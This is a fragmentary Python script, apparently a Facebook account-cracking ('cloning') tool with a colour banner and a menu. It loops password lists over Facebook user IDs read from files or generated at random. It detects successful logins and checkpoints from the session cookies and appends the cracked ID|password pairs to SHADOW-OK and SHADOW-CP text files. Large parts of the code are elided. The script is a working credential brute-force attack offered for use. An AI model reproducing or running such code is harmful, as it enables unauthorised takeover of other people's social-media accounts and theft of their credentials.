...
###   #   #    #    ####    ###   #   #        
 ...
 #   #  #   #  #   #   #  #  #   #  ## ##        
  ###   #   #  #   #  ####    ###   #   # 
\33[1;37m----------------------------------------------
\33[1;97m[\33[1;92m=\33[1;97m] \33[1;92mFACEBOOK  \x1b[1;97m : \33[1;92m PARVEZ KAZI            
\33[1;97m[\33[1;92m=\33[1;97m] \33[1;92mGITHUB    \x1b[1;97m : \33[1;92m PAID      
\33[1;97m[\33[1;92m=\33[1;97m] \33[1;92mTOOLTYPE  \x1b[1;97m : \33[1;92m FILE \x1b[1;97m〆\x1b[1;92m RANDOM 
...
def menu():
			...
			if sexxx in ['1','01']:
				os.system('clear')
				print(logo)
				print(' Example : /sdcard/SHADOW.txt')
				linex()
				...
				os.system('xdg-open https://t.me/riadchowdhuryofficial');menu()
			elif sexxx in ['0','00']:
				exit('')
			else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[SHADOW-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/SHADOW-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[SHADOW-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SHADOW-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def _SEXX_2(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mSHADOW\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[SHADOW-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SHADOW-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def fuckxx():
	...
	linex()
	opt = input('[√] SELECT OPTION : \x1b[1;92m')
	if opt =='1':
		random_number3()    
	else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[SHADOW-OK] '+cid+' | '+ps+'\033[1;32m')
				open('SHADOW-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[SHADOW-CP] '+cid+' | '+ps+'\33[0;97m')
				open('SHADOW-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
